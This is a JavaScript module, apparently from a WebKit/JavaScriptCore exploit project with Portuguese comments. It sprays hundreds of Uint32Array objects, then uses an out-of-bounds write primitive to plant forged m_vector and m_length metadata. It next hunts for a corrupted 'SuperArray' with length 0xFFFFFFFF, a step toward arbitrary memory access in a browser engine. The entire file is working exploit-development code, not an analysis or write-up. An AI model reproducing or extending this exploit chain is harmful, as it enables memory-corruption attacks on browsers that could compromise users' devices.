// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO, OOB_CONFIG } from '../config.mjs';

const FNAME_REPLICATE_LOG_SUCCESS = "replicateLogSuccessAndValidateSuperArray_v26a";

const CORRUPTION_OFFSET_TRIGGER = 0x70; // Onde o trigger principal é escrito
const CORRUPTION_VALUE_TRIGGER = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);

// Offsets baseados no seu log de sucesso e config.mjs (M_VECTOR_OFFSET=0x10, M_LENGTH_OFFSET=0x18)
// Se o objeto JS vítima está "mapeado" a partir de 0x58 no oob_buffer:
const VICTIM_VIEW_METADATA_BASE_IN_OOB = 0x58; 
const ACTUAL_M_VECTOR_OFFSET_IN_OOB = VICTIM_VIEW_METADATA_BASE_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x58 + 0x10 = 0x68
const ACTUAL_M_LENGTH_OFFSET_IN_OOB = VICTIM_VIEW_METADATA_BASE_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // 0x58 + 0x18 = 0x70

// Valores plantados INICIALMENTE no oob_buffer, conforme seu log
const INITIAL_PLANTED_M_VECTOR = new AdvancedInt64(0x11223344, 0xAABBCCDD); // Low, High (aabbccdd_11223344)
// m_length é plantado como parte do QWORD em 0x6C, mas o que importa para o objeto JS é o valor em ACTUAL_M_LENGTH_OFFSET_IN_OOB (0x70)
// O seu log mostra que m_length (em 0x70) torna-se 0xFFFFFFFF após o trigger.
// Vamos plantar um valor DISTINTO em 0x70 para ver se ele é usado, ou se é o trigger que define.
const INITIAL_PLANTED_M_LENGTH_DWORD = 0xBAD0BAD0; 


const EXPECTED_CORRUPTED_M_VECTOR_VAL = new AdvancedInt64(0xAABBCCDD, 0x11223344); // Low, High (0x11223344_aabbccdd) - o valor que apareceu no seu log
const EXPECTED_CORRUPTED_M_LENGTH_VAL = 0xFFFFFFFF;

const NUM_SPRAY_OBJECTS = 500;
const ORIGINAL_SPRAY_LENGTH = 8;

// Marcador para verificar se o superArray mapeia para o oob_array_buffer_real
const MARKER_FOR_OOB_BUFFER_CHECK = 0xABBAABBA;
const MARKER_OFFSET_IN_OOB_DATA = 0x40; // Onde plantaremos no oob_array_buffer_real

let sprayedVictimObjects = [];

export async function sprayAndInvestigateObjectExposure() {
    logS3(`--- Iniciando ${FNAME_REPLICATE_LOG_SUCCESS}: Replicar Corrupção de Log e Validar SuperArray ---`, "test", FNAME_REPLICATE_LOG_SUCCESS);
    sprayedVictimObjects = [];

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) { return; }
        logS3("Ambiente OOB inicializado.", "info", FNAME_REPLICATE_LOG_SUCCESS);

        // FASE 1: Spray
        logS3(`FASE 1: Pulverizando ${NUM_SPRAY_OBJECTS} Uint32Array(${ORIGINAL_SPRAY_LENGTH})...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        for (let i = 0; i < NUM_SPRAY_OBJECTS; i++) {
            const u32arr = new Uint32Array(ORIGINAL_SPRAY_LENGTH);
            u32arr[0] = 0xC0DEC0DE ^ i;
            sprayedVictimObjects.push(u32arr);
        }
        logS3("Pulverização concluída.", "good", FNAME_REPLICATE_LOG_SUCCESS);

        // FASE 2: Plantar metadados no oob_array_buffer_real
        // O log original plantava um QWORD em 0x68 e outro em 0x6C.
        // Vamos focar em ter os valores corretos em 0x68 (para m_vector) e 0x70 (para m_length)
        // ANTES que o trigger em 0x70 os sobrescreva no oob_buffer.
        logS3(`FASE 2: Plantando metadados em oob_buffer para replicação...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`  Plantando m_vector_candidate=${INITIAL_PLANTED_M_VECTOR.toString(true)} em oob_buffer[${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)}] (0x68)`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        oob_write_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, INITIAL_PLANTED_M_VECTOR, 8);
        
        logS3(`  Plantando m_length_candidate=${toHex(INITIAL_PLANTED_M_LENGTH_DWORD)} em oob_buffer[${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)}] (0x70)`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        oob_write_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, INITIAL_PLANTED_M_LENGTH_DWORD, 4); // m_length é DWORD

        const chk_vec_pre = oob_read_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, 8);
        const chk_len_pre = oob_read_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, 4);
        logS3(`  Verificação Pós-Plantio (no oob_buffer ANTES DO TRIGGER):`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_vector@${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)}=${chk_vec_pre.toString(true)} (Esperado: ${INITIAL_PLANTED_M_VECTOR.toString(true)})`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_length@${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)}=${toHex(chk_len_pre)} (Esperado: ${toHex(INITIAL_PLANTED_M_LENGTH_DWORD)})`, "info", FNAME_REPLICATE_LOG_SUCCESS);

        // FASE 3: Trigger OOB principal
        logS3(`FASE 3: Realizando escrita OOB (trigger) em oob_buffer[${toHex(CORRUPTION_OFFSET_TRIGGER)}] (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        oob_write_absolute(CORRUPTION_OFFSET_TRIGGER, CORRUPTION_VALUE_TRIGGER, 8);
        logS3("Escrita OOB de trigger realizada.", "good", FNAME_REPLICATE_LOG_SUCCESS);
        
        // Verificar o que está agora nos offsets de metadados DENTRO do oob_buffer
        const vec_in_oob_after_trigger = oob_read_absolute(ACTUAL_M_VECTOR_OFFSET_IN_OOB, 8); 
        const len_in_oob_after_trigger = oob_read_absolute(ACTUAL_M_LENGTH_OFFSET_IN_OOB, 4); 
        logS3(`  Valores NO OOB_BUFFER APÓS trigger:`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_vector@${toHex(ACTUAL_M_VECTOR_OFFSET_IN_OOB)} (0x68) = ${vec_in_oob_after_trigger.toString(true)}`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        logS3(`    m_length@${toHex(ACTUAL_M_LENGTH_OFFSET_IN_OOB)} (0x70) = ${toHex(len_in_oob_after_trigger)}`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        // Esperamos que m_vector@0x68 seja INITIAL_PLANTED_M_VECTOR, ou o valor "invertido" do seu log (0x11223344_aabbccdd)
        // Esperamos que m_length@0x70 seja 0xFFFFFFFF (LOW_DWORD do trigger)

        await PAUSE_S3(300); // Pausa maior para efeitos se propagarem

        // FASE 4: Identificar SuperArray
        logS3(`FASE 4: Tentando identificar SuperArray (pelo length)...`, "info", FNAME_REPLICATE_LOG_SUCCESS);
        let superArray = null;
        let superArrayIndex = -1;

        for (let i = 0; i < sprayedVictimObjects.length; i++) {
            if (sprayedVictimObjects[i] && sprayedVictimObjects[i].length === EXPECTED_CORRUPTED_M_LENGTH_VAL) {
                superArray = sprayedVictimObjects[i];
                superArrayIndex = i;
                logS3(`    !!!! POTENCIAL SUPERARRAY !!!! Índice: ${i}. Length: ${toHex(superArray.length)}`, "vuln", FNAME_REPLICATE_LOG_SUCCESS);
                document.title = `POTENCIAL SuperArray Idx ${i}!`;
                break; 
            }
        }

        if (superArray) {
            logS3(`  Potencial SuperArray (índice ${superArrayIndex}) encontrado com length=${toHex(EXPECTED_CORRUPTED_M_LENGTH_VAL)}.`, "good", FNAME_REPLICATE_LOG_SUCCESS);
            logS3(`  Validando se m_vector foi corrompido para ${EXPECTED_CORRUPTED_M_VECTOR_VAL.toString(true)} (ou algo que mapeie para oob_buffer)...`, "info", FNAME_REPLICATE_LOG_SUCCESS);

            // Escrever um marcador nos dados do oob_array_buffer_real usando a primitiva OOB
            oob_write_absolute(MARKER_OFFSET_IN_OOB_DATA, MARKER_FOR_OOB_BUFFER_CHECK, 4);
            logS3(`    Marcador ${toHex(MARKER_FOR_OOB_BUFFER_CHECK)} escrito em oob_buffer[${toHex(MARKER_OFFSET_IN_OOB_DATA)}] via oob_write.`, "info", FNAME_REPLICATE_LOG_SUCCESS);

            // Se m_vector corrompido apontar para o início dos dados do oob_array_buffer_real,
            // ou se o valor EXPECTED_CORRUPTED_M_VECTOR_VAL for esse endereço.
            // O EXPECTED_CORRUPTED_M_VECTOR_VAL (0x11223344_aabbccdd) não é 0.
            // Precisamos que este seja o endereço DENTRO do qual o SuperArray vai ler.
            // Se este valor for o NOVO dataPointer do ArrayBuffer subjacente ao SuperArray.
            
            // Hipótese: O m_vector do SuperArray se tornou EXPECTED_CORRUPTED_M_VECTOR_VAL.
            // E esse endereço aponta para DADOS que podemos controlar/observar, idealmente o oob_array_buffer_real.
            // Este teste é difícil de validar sem saber para onde EXPECTED_CORRUPTED_M_VECTOR_VAL aponta.

            // Teste mais simples: Se o m_vector foi para 0x0 (como em alguns dos seus logs):
            try {
                const val_at_zero_abs = superArray[0];
                logS3(`    Tentativa de leitura superArray[0] (abs 0x0): ${toHex(val_at_zero_abs)}`, "leak", FNAME_REPLICATE_LOG_SUCCESS);
                if (val_at_zero_abs === MARKER_FOR_OOB_BUFFER_CHECK && MARKER_OFFSET_IN_OOB_DATA === 0) {
                    logS3("      SUCESSO! SuperArray com m_vector=0 mapeia para oob_buffer!", "vuln", FNAME_REPLICATE_LOG_SUCCESS);
                    document.title = "SuperArray m_vec=0 OK!";
                } else if (MARKER_OFFSET_IN_OOB_DATA !== 0) {
                     logS3(`      SuperArray[0] leu de 0x0. Marcador está em ${toHex(MARKER_OFFSET_IN_OOB_DATA)}.`, "info", FNAME_REPLICATE_LOG_SUCCESS);
                }
            } catch (e) {
                 logS3(`    Erro ao ler superArray[0]: ${e.message}`, "error", FNAME_REPLICATE_LOG_SUCCESS);
            }

            // Se o valor de m_vector do log (0x11223344_aabbccdd) for o dataPointer do oob_array_buffer_real
            // Esta verificação é apenas se o m_vector do *superArray* virou 0 e mapeia para o nosso oob_buffer
            // Se o m_vector do superArray virou o valor do log (0x11223344_aabbccdd) e esse valor NÃO É o dataPointer do oob_buffer,
            // então a leitura do marcador falhará.

            logS3("  SuperArray com length correto encontrado. A validação exata de m_vector requer mais informações ou uma primitiva de leitura de metadados do objeto.", "info", FNAME_REPLICATE_LOG_SUCCESS);


        } else {
            logS3("  Nenhum SuperArray (Uint32Array com length corrompido para 0xFFFFFFFF) identificado.", "error", FNAME_REPLICATE_SUCCESS);
            document.title = "SuperArray NÃO Encontrado (v26a)";
        }

    } catch (e) {
        logS3(`ERRO CRÍTICO em ${FNAME_REPLICATE_LOG_SUCCESS}: ${e.message}`, "critical", FNAME_REPLICATE_LOG_SUCCESS);
        document.title = `${FNAME_REPLICATE_LOG_SUCCESS} FALHOU!`;
    } finally {
        sprayedVictimObjects = [];
        clearOOBEnvironment();
        logS3(`--- ${FNAME_REPLICATE_LOG_SUCCESS} Concluído ---`, "test", FNAME_REPLICATE_LOG_SUCCESS);
    }
}
